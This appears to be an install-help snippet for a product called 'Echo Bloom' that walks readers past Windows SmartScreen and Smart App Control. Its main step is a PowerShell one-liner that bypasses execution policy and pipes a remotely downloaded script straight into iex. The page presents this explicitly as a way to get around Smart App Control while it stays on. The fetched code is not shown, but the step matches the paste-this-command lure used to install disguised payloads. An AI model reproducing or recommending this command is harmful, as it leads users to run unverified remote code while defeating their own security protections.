If Windows blocks it
Echo Bloom isn’t code-signed yet — a certificate costs more than this project currently makes. Two ways past it, and the second one needs nothing turned off:
  1. SmartScreen — “Windows protected your PC” → More info → Run anyway.
  2. Smart App Control (some Windows 11 machines) will block the file outright with no “run anyway”. Rather than turn it off, use the command below instead — a command you type isn’t a downloaded file, so Smart App Control doesn’t apply to it. Same installer, same result.
Turning Smart App Control off does work, but on Windows 11 it can’t be switched back on without reinstalling — so try the command first.
Command (works with Smart App Control on)
powershell -ExecutionPolicy Bypass -Command "iwr -useb https://everysynthetic.org/install_wizard.ps1 | iex"
Press Win, type powershell, hit Enter, then paste with Ctrl+V and press Enter.
